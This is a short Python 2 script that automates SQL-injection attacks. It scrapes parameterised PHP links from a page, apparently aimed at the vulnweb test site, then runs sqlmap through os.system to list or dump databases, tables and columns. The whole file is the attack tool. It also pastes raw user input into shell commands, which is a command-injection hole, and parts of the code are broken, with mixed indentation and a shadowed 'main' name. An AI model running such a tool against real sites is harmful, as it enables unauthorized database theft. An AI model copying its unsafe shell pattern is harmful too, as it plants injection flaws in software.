import requests
import bs4
import os
import re


print("HPE CTY SQLMAP AUTOMATION")

url = raw_input("Enter a sql_url: ")  # for sql url
print("The URL Entered is: ",url)
res = requests.get(url)
#print(res.text)
soup = bs4.BeautifulSoup(res.text, 'html5lib')
main = 'http://testphp.vulnweb.com/'

list1=[]
for link in soup.find_all('a',href=True):
	if main in link['href']:
		list1.append(link['href'])
            	#print(link['href'])
	else:
            list1.append(main+link['href'])
            #print(main+link['href'])
list2=[]

for i in list1:
	if "php?" in i:
		list2.append(i)
#print(list2)
print(" ")
print("choose an URL: ")
print("Your option are :")
for i in list2:
	print(i)
print(" ")

url = raw_input("Enter the choosen sql_url: ")  # for sql url
print(" ")
cookie = raw_input("Enter cookie of the website (optional): ")

if cookie=="":
	print("""
            1. Database Dump
            2. Tables names Dump
            3. Column names Dump
            4. Dump All
            5. exit
            """)


	def database():
	    os.system("sqlmap " + "-u " + url + " --dbs")  # for show database's


	def tables():
	    #d_name = input("Enter a database name: ")
	    os.system("sqlmap " + "-u " + url + " --tables")


	'''
	def col():
	    d_name = input("Enter a database name: ")
	    t_nmae = input("Enter a tables name: ")
	    os.system("sqlmap " + "-u " + url + " -D " + d_name + " -T" + t_nmae + " --column" + "--dump")
	'''

	def col_dump():
	    #d_name = input("Enter a database name: ")
	    #t_nmae = input("Enter a tables name: ")
	    #c_name = input("Enter a column name: ")
	    os.system("sqlmap " + "-u " + url + " --columns")

	def a_dump():
	    os.system("sqlmap " + "-u " + url + " --dump")


	def main():
	    choose = int(input("Enter a number: "))
	    if choose == 1:
		database()
	    elif choose == 2:
		tables()
	    elif choose == 3:
		col_dump()
	    elif choose == 4:
		a_dump()
	    elif choose == 5:
		os.system("clear")
		print("Thank you for enjoy!!")
		os.system("exit")
	    else:
		print("wrong!!")


	main()




